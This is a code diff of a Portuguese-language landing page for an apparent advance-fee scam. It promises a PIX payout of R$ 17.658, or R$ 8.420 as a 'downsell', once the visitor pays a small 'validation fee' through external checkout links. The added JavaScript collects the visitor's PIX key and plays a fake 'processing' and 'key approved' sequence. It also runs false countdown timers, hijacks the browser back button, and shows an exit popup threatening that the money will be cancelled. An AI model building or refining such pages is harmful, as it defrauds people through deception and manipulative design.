+        Como o prazo da <strong>Cota Master</strong> foi excedido, o sistema ativou o protocolo de segurança para você não sair de mãos vazias: sua chave PIX foi transferida para a <strong>Cota Secundária de R$ 8.420,00</strong>.<br><br>
+        Por ser um valor menor, a taxa de validação bancária exigida pelo gateway caiu de <span style="text-decoration: line-through; color: #ef4444;">R$ 19,90</span> para <strong>apenas R$ 11,68</strong>.
+      </div>
+
+      <div class="cota-row expired">
+        <div>
+          <strong style="color: #ef4444; font-size: 11.5px;">✕ COTA MASTER (EXPIRADA)</strong><br>
+          <span style="font-size: 10px; color: #64748b;">Taxa exigida era R$ 19,90</span>
+        </div>
+        <div class="price">R$ 17.658,00</div>
+      </div>
+
+      <div class="cota-row active">
+        <div>
+          <strong style="font-size: 11.5px;">✓ COTA EXPRESS (LIBERADA AGORA)</strong><br>
+          <span style="font-size: 10px; color: #a7f3d0;">Taxa proporcional de apenas R$ 11,68</span>
+        </div>
+        <div class="price">R$ 8.420,00</div>
+      </div>
+
+      <div class="downsell-price-highlight">
+        <div class="old">De R$ 19,90 por</div>
+        <div class="label">APENAS TAXA DE VALIDAÇÃO REDUZIDA:</div>
+        <div class="val"><span>R$</span> 11,68</div>
+        <div class="info">Pagamento único via PIX · Depósito de R$ 8.420,00 em até 3 min</div>
+      </div>
+
+      <!-- Botão Direto para o checkout do Downsell -->
+      <button class="btn-green" id="btnDownsellPay" type="button" style="padding: 16px; font-size: 13.5px;">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M21 12V7a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-5z"/>
+          <path d="M16 12h5a1 1 0 0 0 1-1V9a1 1 0 0 0-1-1h-5a2 2 0 0 0-2 2v0a2 2 0 0 0 2 2z"/>
+          <circle cx="18.5" cy="10" r="0.9" fill="currentColor"/>
+        </svg>
+        <div style="display: flex; flex-direction: column; align-items: center; gap: 2px;">
+          <span>PAGAR R$ 11,68 E SACAR MEUS R$ 8.420,00 AGORA</span>
+          <span style="font-size: 10px; font-weight: 500; text-transform: none; opacity: 0.9;">Transferência imediata para sua chave PIX cadastrada</span>
+        </div>
+      </button>
+
+      <div class="downsell-footer-badges">
+        <span>🔒 Conexão Criptografada SSL</span>
+        <span>✓ Garantia de Envio Imediato</span>
+      </div>
+    </div>
+
+    <div style="text-align: center; margin: 10px 0 20px;">
+      <a href="javascript:void(0);" style="font-size: 11px; color: #64748b; text-decoration: underline;">
+        Prefiro não pagar R$ 11,68 e abrir mão também dos meus R$ 8.420,00
+      </a>
+    </div>
+
+  </div>
+
+  <!-- ==================== MODAL PIX (3 ETAPAS) ==================== -->
+  <div class="modal-backdrop" id="pixModalBackdrop">
+    <div class="modal-card">
+      <button class="modal-close-btn" id="modalCloseBtn" type="button">✕</button>
+
+      <!-- Etapa 1: Inserir Chave -->
+      <div id="modalStep1">
+        <div class="modal-circle-icon green-light">
+          <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <line x1="12" y1="1" x2="12" y2="23"/>
+            <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/>
+          </svg>
+        </div>
+        <h3 class="modal-title">Para onde enviamos o PIX?</h3>
+        <p class="modal-desc">Cadastre a chave exata onde deseja receber os <strong style="color: #0f172a;">R$ 17.658,00</strong> agora mesmo.</p>
+        
+        <label class="pix-input-label">Sua Chave PIX</label>
+        <input class="pix-input" id="pixKeyInput" type="text" placeholder="CPF, Celular, E-mail ou Chave Aleatória">
+        
+        <button class="btn-blue" id="btnConfirmPixKey" type="button">
+          CONFIRMAR MINHA CHAVE →
+        </button>
+      </div>
+
+      <!-- Etapa 2: Processamento -->
+      <div id="modalStep2" style="display: none; text-align: center;">
+        <div class="modal-circle-icon blue-light">
+          <svg class="spin-animation" width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+            <line x1="12" y1="2" x2="12" y2="6"/>
+            <line x1="12" y1="18" x2="12" y2="22"/>
+            <line x1="4.93" y1="4.93" x2="7.76" y2="7.76"/>
+            <line x1="16.24" y1="16.24" x2="19.07" y2="19.07"/>
+            <line x1="2" y1="12" x2="6" y2="12"/>
+            <line x1="18" y1="12" x2="22" y2="12"/>
+          </svg>
+        </div>
+        <h3 class="modal-title">Processando...</h3>
+        <p class="modal-desc">Aguarde enquanto o sistema valida a sua chave e prepara a transferência segura.</p>
+
+        <div style="font-size: 10px; font-weight: 800; color: #64748b; text-align: left; text-transform: uppercase;">Progresso do Sistema:</div>
+        
+        <div class="status-items">
+          <div id="stepItem1" class="active">⚙️ 1. Validando chave inserida...</div>
+          <div id="stepItem2">○ 2. Calculando taxa antifraude...</div>
+          <div id="stepItem3">○ 3. Gerando link de saque seguro...</div>
+        </div>
+
+        <div class="progress-meta">
+          <span>A concluir</span>
+          <span id="progressPercent">25%</span>
+        </div>
+        <div class="progress-bar-bg">
+          <div class="progress-bar-fill" id="progressBarFill" style="width: 25%;"></div>
+        </div>
+      </div>
+
+      <!-- Etapa 3: Chave Aprovada -->
+      <div id="modalStep3" style="display: none; text-align: center;">
+        <div class="modal-circle-icon green-light">
+          <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="20 6 9 17 4 12"/>
+          </svg>
+        </div>
+        <h3 class="modal-title">Chave PIX Aprovada!</h3>
+        <p class="modal-desc">Pague a taxa de segurança exigida pelo sistema e desbloqueie o saldo <strong>agora mesmo</strong>.</p>
+
+        <div class="modal-warning-box">
+          ⚠️ <strong>Atenção:</strong> O não pagamento da taxa fará com que o valor de R$ 17.658 seja <span style="text-decoration: underline;">cancelado e bloqueado</span>.
+        </div>
+
+        <div style="font-size: 10px; font-weight: 800; color: #64748b; text-align: left; text-transform: uppercase;">Progresso do Sistema:</div>
+        <div class="status-items" style="margin: 10px 0 16px;">
+          <div class="done">✓ 1. Validando chave inserida...</div>
+          <div class="done">✓ 2. Calculando taxa antifraude...</div>
+          <div class="done">✓ 3. Gerando link de saque seguro...</div>
+        </div>
+
+        <div class="progress-meta">
+          <span>A concluir</span>
+          <span style="color: #059669;">100%</span>
+        </div>
+        <div class="progress-bar-bg" style="margin-bottom: 18px;">
+          <div class="progress-bar-fill" style="width: 100%; background: #10b981;"></div>
+        </div>
+
+        <button class="btn-redirect" id="btnRedirectCheckout" type="button">
+          Redirecionando para o checkout seguro em <span id="checkoutSecs">4</span>s...
+        </button>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ==================== POPUP DE SAÍDA (EXIT-INTENT) ==================== -->
+  <div class="exit-backdrop" id="exitModalBackdrop">
+    <div class="exit-card">
+      <div class="exit-badge">
+        ⚠️ PROTOCOLO DE CANCELAMENTO INICIADO
+      </div>
+      <h3 class="exit-title">ESPERE! NÃO FECHE ESTA TELA!</h3>
+      <p class="exit-desc">
+        Se sair agora, seu PIX de <strong>R$ 17.658,00</strong> será cancelado irreversivelmente e repassado para a fila de espera.
+      </p>
+
+      <div class="exit-timer-box">
+        Tempo limite para não perder o saque: <strong id="exitSecs">43s</strong>
+      </div>
+
+      <button class="exit-cta" id="btnExitContinue" type="button">
+        CONTINUAR E SACAR MEUS R$ 17.658 AGORA
+      </button>
+
+      <button class="exit-dismiss-link" id="btnExitDismiss" type="button">
+        Abrir mão dos R$ 17.658 e aceitar rebaixar minha cota para R$ 8.420
+      </button>
+    </div>
+  </div>
+
+  <style>
+    @keyframes spin {
+      100% { transform: rotate(360deg); }
+    }
+    .spin-animation {
+      animation: spin 1s linear infinite;
+    }
+  </style>
 
   <script>
     document.addEventListener('DOMContentLoaded', function () {
       
-      // 1. Contagem regressiva funcional a partir de 08:54
-      const clockElement = document.getElementById('countdownClock');
-      let totalSeconds = 8 * 60 + 54; // 08:54 em segundos
+      // ==========================================================
+      // URLS DOS CHECKOUTS COM UPSORT/PARAMETROS DE UTM
+      // ==========================================================
+      const MAIN_CHECKOUT_BASE = 'https://go.perfectpay.com.br/PPU38CQGQEO';
+      const DOWNSELL_CHECKOUT_BASE = 'https://go.perfectpay.com.br/PPU38CQGRTH';
 
-      function updateCountdown() {
-        if (totalSeconds < 0) return;
+      function buildCheckoutUrl(baseUrl) {
+        const currentParams = new URLSearchParams(window.location.search);
+        // Garante upsell=true
+        currentParams.set('upsell', 'true');
+        const qs = currentParams.toString();
+        return baseUrl + (qs ? '?' + qs : '?upsell=true');
+      }
 
+      // ==========================================================
+      // FAQ Accordion
+      // ==========================================================
+      const faqHeaders = document.querySelectorAll('.faq-header');
+      faqHeaders.forEach(header => {
+        header.addEventListener('click', function () {
+          const item = this.parentElement;
+          const body = item.querySelector('.faq-body');
+          const isCurrentlyActive = item.classList.contains('active');
+
+          document.querySelectorAll('.faq-item').forEach(otherItem => {
+            otherItem.classList.remove('active');
+            otherItem.querySelector('.faq-header').setAttribute('aria-expanded', 'false');
+            otherItem.querySelector('.faq-body').style.maxHeight = '0px';
+          });
+
+          if (!isCurrentlyActive) {
+            item.classList.add('active');
+            this.setAttribute('aria-expanded', 'true');
+            body.style.maxHeight = body.scrollHeight + 'px';
+          }
+        });
+      });
+
+      // ==========================================================
+      // Timers da Página Principal (09:51)
+      // ==========================================================
+      let totalSeconds = 9 * 60 + 51;
+      function updateTimers() {
         const minutes = Math.floor(totalSeconds / 60);
         const seconds = totalSeconds % 60;
+        const formattedTime = 
+          String(minutes).padStart(2, '0') + ':' + 
+          String(seconds).padStart(2, '0');
 
-        const formattedMinutes = String(minutes).padStart(2, '0');
-        const formattedSeconds = String(seconds).padStart(2, '0');
+        const topEl = document.getElementById('topTimer');
+        const btmEl = document.getElementById('bottomTimer');
+        if (topEl) topEl.textContent = formattedTime;
+        if (btmEl) btmEl.textContent = formattedTime;
 
-        if (clockElement) {
-          clockElement.textContent = `${formattedMinutes}:${formattedSeconds}`;
-        }
+        if (totalSeconds > 0) totalSeconds--;
+      }
+      setInterval(updateTimers, 1000);
 
-        totalSeconds--;
+      // ==========================================================
+      // MODAL PIX EM 3 ETAPAS
+      // ==========================================================
+      const pixModal = document.getElementById('pixModalBackdrop');
+      const step1 = document.getElementById('modalStep1');
+      const step2 = document.getElementById('modalStep2');
+      const step3 = document.getElementById('modalStep3');
+      const progressBar = document.getElementById('progressBarFill');
+      const progressPercent = document.getElementById('progressPercent');
+      const checkoutSecs = document.getElementById('checkoutSecs');
+      let countdownInterval = null;
+
+      function openPixModal() {
+        pixModal.classList.add('open');
+        step1.style.display = 'block';
+        step2.style.display = 'none';
+        step3.style.display = 'none';
       }
 
-      updateCountdown();
-      const timerInterval = setInterval(updateCountdown, 1000);
+      function closePixModal() {
+        pixModal.classList.remove('open');
+        if (countdownInterval) clearInterval(countdownInterval);
+      }
 
-      // 2. Preservação dinâmica de UTMs e repasse para o checkout
-      const ctaBtn = document.getElementById('ctaButton');
-      if (ctaBtn) {
-        const currentQuery = window.location.search;
-        if (currentQuery) {
-          try {
-            const currentUrl = new URL(ctaBtn.href);
-            const incomingParams = new URLSearchParams(currentQuery);
+      document.querySelectorAll('.open-pix-btn').forEach(btn => {
+        btn.addEventListener('click', openPixModal);
+      });
 
-            incomingParams.forEach((value, key) => {
-              currentUrl.searchParams.set(key, value);
-            });
+      document.getElementById('modalCloseBtn').addEventListener('click', closePixModal);
+      pixModal.addEventListener('click', (e) => {
+        if (e.target === pixModal) closePixModal();
+      });
 
-            // Garante que upsell=true continue presente
-            currentUrl.searchParams.set('upsell', 'true');
-            ctaBtn.href = currentUrl.toString();
-          } catch (e) {
-            console.error('Erro ao repassar UTMs:', e);
+      // Avançar da Etapa 1 para Etapa 2
+      document.getElementById('btnConfirmPixKey').addEventListener('click', function () {
+        step1.style.display = 'none';
+        step2.style.display = 'block';
+
+        progressBar.style.width = '25%';
+        progressPercent.textContent = '25%';
+
+        setTimeout(() => {
+          document.getElementById('stepItem1').className = 'done';
+          document.getElementById('stepItem1').textContent = '✓ 1. Validando chave inserida...';
+          document.getElementById('stepItem2').className = 'active';
+          document.getElementById('stepItem2').textContent = '⚙️ 2. Calculando taxa antifraude...';
+          progressBar.style.width = '65%';
+          progressPercent.textContent = '65%';
+        }, 1100);
+
+        setTimeout(() => {
+          document.getElementById('stepItem2').className = 'done';
+          document.getElementById('stepItem2').textContent = '✓ 2. Calculando taxa antifraude...';
+          document.getElementById('stepItem3').className = 'active';
+          document.getElementById('stepItem3').textContent = '⚙️ 3. Gerando link de saque seguro...';
+          progressBar.style.width = '90%';
+          progressPercent.textContent = '90%';
+        }, 2200);
+
+        setTimeout(() => {
+          step2.style.display = 'none';
+          step3.style.display = 'block';
+          startCheckoutCountdown();
+        }, 3200);
+      });
+
+      function startCheckoutCountdown() {
+        let secs = 4;
+        checkoutSecs.textContent = secs;
+        countdownInterval = setInterval(() => {
+          secs--;
+          if (checkoutSecs) checkoutSecs.textContent = secs;
+          if (secs <= 0) {
+            clearInterval(countdownInterval);
+            window.location.href = buildCheckoutUrl(MAIN_CHECKOUT_BASE);
           }
-        }
+        }, 1000);
       }
+
+      document.getElementById('btnRedirectCheckout').addEventListener('click', function () {
+        if (countdownInterval) clearInterval(countdownInterval);
+        window.location.href = buildCheckoutUrl(MAIN_CHECKOUT_BASE);
+      });
+
+      // ==========================================================
+      // POPUP DE SAÍDA (EXIT-INTENT) & BACK-REDIRECT
+      // ==========================================================
+      const exitModal = document.getElementById('exitModalBackdrop');
+      let exitModalShown = false;
+      let exitCountdownInterval = null;
+
+      function showExitModal() {
+        if (exitModalShown) return;
+        exitModalShown = true;
+        closePixModal();
+        exitModal.classList.add('open');
+
+        let secs = 43;
+        const exitSecsEl = document.getElementById('exitSecs');
+        exitCountdownInterval = setInterval(() => {
+          secs--;
+          if (exitSecsEl) exitSecsEl.textContent = secs + 's';
+          if (secs <= 0) {
+            clearInterval(exitCountdownInterval);
+          }
+        }, 1000);
+      }
+
+      // Detecção de saída no Desktop (mouse no topo)
+      document.addEventListener('mouseleave', function (e) {
+        if (e.clientY <= 15) {
+          showExitModal();
+        }
+      });
+
+      // Back-Redirect no celular (Histórico do Navegador)
+      window.history.pushState({ page: 'main' }, '', window.location.href);
+      window.addEventListener('popstate', function (e) {
+        if (!exitModalShown) {
+          window.history.pushState({ page: 'main' }, '', window.location.href);
+          showExitModal();
+        }
+      });
+
+      // Botão "CONTINUAR E SACAR MEUS R$ 17.658 AGORA"
+      document.getElementById('btnExitContinue').addEventListener('click', function () {
+        exitModal.classList.remove('open');
+        if (exitCountdownInterval) clearInterval(exitCountdownInterval);
+        openPixModal();
+      });
+
+      // ==========================================================
+      // TRANSIÇÃO PARA PÁGINA DOWNSELL (R$ 8.420)
+      // ==========================================================
+      const mainContainer = document.getElementById('mainContainer');
+      const downsellContainer = document.getElementById('downsellContainer');
+      let downsellTimerInterval = null;
+
+      function openDownsellPage() {
+        exitModal.classList.remove('open');
+        if (exitCountdownInterval) clearInterval(exitCountdownInterval);
+        closePixModal();
+
+        // Esconde container principal e mostra downsell
+        mainContainer.style.display = 'none';
+        document.body.style.backgroundColor = '#070a12';
+        downsellContainer.classList.add('active');
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+
+        // Timer do Downsell (01:00)
+        let dsSeconds = 60;
+        const dsTimerEl = document.getElementById('downsellTimer');
+        downsellTimerInterval = setInterval(() => {
+          dsSeconds--;
+          const m = Math.floor(dsSeconds / 60);
+          const s = dsSeconds % 60;
+          if (dsTimerEl) {
+            dsTimerEl.textContent = 
+              String(m).padStart(2, '0') + ':' + 
+              String(s).padStart(2, '0');
+          }
+          if (dsSeconds <= 0) {
+            clearInterval(downsellTimerInterval);
+          }
+        }, 1000);
+      }
+
+      // Dispara o downsell ao clicar no link de abrir mão
+      const btnDismiss = document.getElementById('btnExitDismiss');
+      btnDismiss.addEventListener('click', function (e) {
+        e.preventDefault();
+        e.stopPropagation();
+        openDownsellPage();
+      });
+
+      // Botão verde de checkout do Downsell (R$ 11,68)
+      document.getElementById('btnDownsellPay').addEventListener('click', function () {
+        window.location.href = buildCheckoutUrl(DOWNSELL_CHECKOUT_BASE);
+      });
+
     });
   </script>
 </body>
